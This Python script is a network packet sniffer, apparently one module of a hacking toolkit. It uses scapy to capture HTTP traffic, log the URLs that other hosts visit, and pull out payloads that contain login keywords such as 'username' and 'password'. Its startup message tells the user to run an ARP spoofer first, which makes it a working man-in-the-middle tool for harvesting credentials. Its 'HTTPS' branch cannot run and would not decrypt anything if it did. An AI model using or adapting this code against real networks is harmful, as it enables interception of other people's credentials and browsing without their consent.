import time
import subprocess
import re
import psutil
from colorama import Fore, Style
from prettytable import PrettyTable
import scapy.all as scapy
from scapy.layers import http

def get_current_mac(interface):
    try:
        output = subprocess.check_output(["ifconfig", interface])
        return re.search("\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", str(output)).group(0)
    except Exception as e:
        print(f"Error: {e}")

def get_current_ip(interface):
    try:
        output = subprocess.check_output(["ifconfig", interface])
        pattern = re.compile(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})')
        output_str = output.decode()
        ip = pattern.search(output_str)[0]
        return ip
    except Exception as e:
        print(f"Error: {e}")

def ip_table():
    addrs = psutil.net_if_addrs()
    t = PrettyTable([f'{Fore.GREEN}Interface', 'Mac Address', f'IP Address{Style.RESET_ALL}'])
    for k, v in addrs.items():
        mac = get_current_mac(k)
        ip = get_current_ip(k)
        if ip and mac:
            t.add_row([k, mac, ip])
        elif mac:
            t.add_row([k, mac, f"{Fore.YELLOW}No IP assigned{Style.RESET_ALL}"])
        elif ip:
            t.add_row([k, f"{Fore.YELLOW}No MAC assigned{Style.RESET_ALL}", ip])
    print(t)

def packet_callback(packet):
    if packet.haslayer(http.HTTPRequest):
        print("[+] HTTP REQUEST >>>>>")
        url_extractor(packet)
        login_info = get_login_info(packet)
        if login_info:
            print(f"{Fore.GREEN}[+] Username OR password is sent: {login_info}{Style.RESET_ALL}")
        if choice.upper() == "Y":
            raw_http_request(packet)
    elif packet.haslayer(scapy.TCP) and packet.haslayer(scapy.Raw):
        if packet.haslayer(http.HTTPRequest):
            print("[+] HTTPS Packet Captured")
            url_extractor(packet)
            login_info = get_login_info(packet)

            if login_info:
                print(f"{Fore.GREEN}[+] Username OR password is sent: {login_info}{Style.RESET_ALL}")
            if choice.upper() == "Y":
                raw_http_request(packet)

def url_extractor(packet):
    if packet.haslayer(http.HTTPRequest):
        http_layer = packet.getlayer('HTTPRequest').fields
        ip_layer = packet.getlayer('IP').fields
        print(f"{ip_layer['src']} just requested\n{http_layer['Method'].decode()} {http_layer['Host'].decode()} {http_layer['Path'].decode()}")

def raw_http_request(packet):
    if packet.haslayer(http.HTTPRequest):
        http_layer = packet[http.HTTPRequest].fields
        print("-----------------***Raw HTTP Packet***-------------------")
        print("{:<8} {:<15}".format('Key', 'Label'))
        try:
            for k, v in http_layer.items():
                try:
                    label = v.decode()
                except:
                    continue
                print("{:<40} {:<15}".format(k, label))
        except KeyboardInterrupt:
            print("\n[+] Quitting Program...")
        print("---------------------------------------------------------")


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=packet_callback, filter="tcp port 443 or port 80")


def funky_banner():
    print(Fore.GREEN + r"""   
#################################################################
╭━━━╮╱╱╱╱╱╭╮╱╱╱╱╭╮╱╭━━━┳━╮╱╭┳━━┳━━━┳━━━┳━━━┳━━━╮###############
┃╭━╮┃╱╱╱╱╱┃┃╱╱╱╭╯╰╮┃╭━╮┃┃╰╮┃┣┫┣┫╭━━┫╭━━┫╭━━┫╭━╮┃#############
┃╰━╯┣━━┳━━┫┃╭┳━┻╮╭╯┃╰━━┫╭╮╰╯┃┃┃┃╰━━┫╰━━┫╰━━┫╰━╯┃############
┃╭━━┫╭╮┃╭━┫╰╯┫┃━┫┃╱╰━━╮┃┃╰╮┃┃┃┃┃╭━━┫╭━━┫╭━━┫╭╮╭╯############
┃┃╱╱┃╭╮┃╰━┫╭╮┫┃━┫╰╮┃╰━╯┃┃╱┃┃┣┫┣┫┃╱╱┃┃╱╱┃╰━━┫┃┃╰╮#############
╰╯╱╱╰╯╰┻━━┻╯╰┻━━┻━╯╰━━━┻╯╱╰━┻━━┻╯╱╱╰╯╱╱╰━━━┻╯╰━╯###############
#################################################################
🅜🅐🅓🅔 🅑🅨 : 🅙🅐🅨🅔🅢🅗  
///////////////////////////////////////////////////////////////////////                                      
    """ + Style.RESET_ALL)
def main_sniff():
    funky_banner()
    print(f"{Fore.BLUE}Welcome To Packet Sniffer{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[***] Please Start Arp Spoofer Before Using this Module [***] {Style.RESET_ALL}")
    try:


        global choice
        choice = input("[*] Do you want to print the raw Packet: Y?N: ")
        ip_table()
        interface = input("[*] Please enter the interface name: ")
        print("[*] Sniffing Packets...")
        sniff(interface)
        print(f"{Fore.YELLOW}\n[*] Redirecting to Main Menu...{Style.RESET_ALL}")
        time.sleep(3)
    except KeyboardInterrupt:
        print(f"{Fore.RED}\n[!] Redirecting to Main Menu...{Style.RESET_ALL}")
        time.sleep(3)

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        try:
            load = packet[scapy.Raw].load.decode('utf-8', errors='ignore')
            keywords = ["username", "user", "email", "pass", "login", "password", "UserName", "Password"]
            for keyword in keywords:
                if keyword in load:
                    return load
        except UnicodeDecodeError:
            print(f"Unable to decode packet load: {packet[scapy.Raw].load}")
    return None

if __name__ == "__main__":
    main_sniff()
